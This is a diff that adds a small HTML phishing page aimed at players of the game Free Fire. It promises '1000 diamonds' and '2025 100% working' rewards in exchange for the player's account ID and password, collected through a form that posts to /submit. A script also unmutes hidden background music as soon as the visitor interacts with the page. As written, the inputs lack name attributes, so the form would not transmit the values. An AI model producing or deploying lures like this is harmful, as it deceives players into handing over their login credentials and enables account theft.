@@ -1,0 +1,73 @@
+<!DOCTYPE html>
+<html>
+<head>
+<title>
+Huh
+</title>
+</head>
+<body>
+<form action= "/submit" method="POST">
+<label for="mail">Free fire id:
+</label>
+
+<input type="email" id ="mail">
+<br>
+<br>
+
+<label for="pass">Password:</label>
+<input type="password" id="pass">
+
+
+<input type="submit" value="Send">
+</form>
+<img src ="scuff.png">
+
+<b>
+<hr>
+Free diamonds!!!
+<hr>
+<b>
+<h1>
+Enter your free id above to get 1000 diamonds in your account.
+</h1>
+
+<h2>
+2025 100% working.
+</h2>
+
+<style>
+h1{
+color:red}
+
+h2{
+color:blue
+}
+
+</style>
+<h1>You before  VS You after :</h1> <br>
+
+<img src ="oldge.png" width="210" height="210">  <img src = "happy.png">
+
+<audio id="bgmusic" autoplay muted loop src="song.mp3" style="display:none;"></audio>
+
+<script>
+const music = document.getElementById('bgmusic');
+
+function tryPlay() {
+  music.muted = false;
+  music.play().then(() => {
+    console.log("Music is now playing!");
+  }).catch(err => {
+    console.log("Autoplay blocked until user interacts:", err);
+  });
+}
+
+document.addEventListener('click', tryPlay, { once: true });
+document.addEventListener('keydown', tryPlay, { once: true });
+document.addEventListener('scroll', tryPlay, { once: true });
+</script>
+
+
+
+</body>
+</html>
